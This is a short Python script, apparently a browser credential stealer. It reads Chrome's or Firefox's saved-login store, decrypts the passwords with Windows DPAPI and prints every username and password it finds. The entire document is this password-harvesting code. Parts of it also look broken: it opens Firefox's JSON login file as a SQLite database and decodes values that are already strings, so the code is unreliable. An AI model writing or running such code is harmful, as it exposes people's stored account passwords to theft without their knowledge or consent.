import os
import sqlite3
import win32crypt

def get_browser_saved_credentials(browser_name):
    credentials = []
    if browser_name.lower() == "chrome":
        path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Default", "Login Data")
    elif browser_name.lower() == "firefox":
        path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
        profiles = os.listdir(path)
        for profile in profiles:
            if "default" in profile.lower():
                path = os.path.join(path, profile, "logins.json")
                break
    else:
        raise ValueError("Unsupported browser")

    if os.path.exists(path):
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute("SELECT username_value, password_value FROM logins")
        for username, password in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
            if username and password:
                credentials.append((username.decode("utf-8"), password.decode("utf-8")))
        conn.close()
    return credentials

browser_name = input("Enter browser name (Chrome/Firefox): ")
saved_credentials = get_browser_saved_credentials(browser_name)
if saved_credentials:
    print("Saved credentials:")
    for username, password in saved_credentials:
        print("Username:", username)
        print("Password:", password)
else:
    print("No saved credentials found for the specified browser.")
